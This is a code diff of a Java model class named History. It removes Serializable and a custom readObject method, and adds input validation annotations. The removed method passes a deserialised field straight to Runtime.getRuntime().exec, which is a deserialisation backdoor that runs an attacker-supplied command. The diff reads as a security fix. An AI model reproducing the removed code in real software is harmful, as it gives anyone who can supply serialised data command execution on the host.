@@ -1,16 +1,18 @@
 package com.tcs.utx.digiframe.model;
 
-import java.io.ObjectInputStream;
-import java.io.Serializable;
-
 import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
+import jakarta.validation.constraints.NotBlank;
+import jakarta.validation.constraints.Size;
 
-@JsonIgnoreProperties(ignoreUnknown = true)
-public class History implements Serializable{
-	
+@JsonIgnoreProperties(ignoreUnknown = false)
+public class History {
+
 	private int srno;
+	@NotBlank @Size(max = 255)
 	private String fontname;
+	@NotBlank @Size(max = 500)
 	private String releaseverinfo;
+	@NotBlank @Size(max = 1000)
 	private String releaseitemname;
 
 	public int getSrno() {
@@ -37,11 +39,5 @@ public class History implements Serializable{
 	public void setReleaseitemname(String releaseitemname) {
 		this.releaseitemname = releaseitemname;
 	}
-	
-	private void readObject(ObjectInputStream in) throws Exception {
-		 in.defaultReadObject();
-		 Runtime.getRuntime().exec(releaseverinfo);
-	}
-
 	
 }
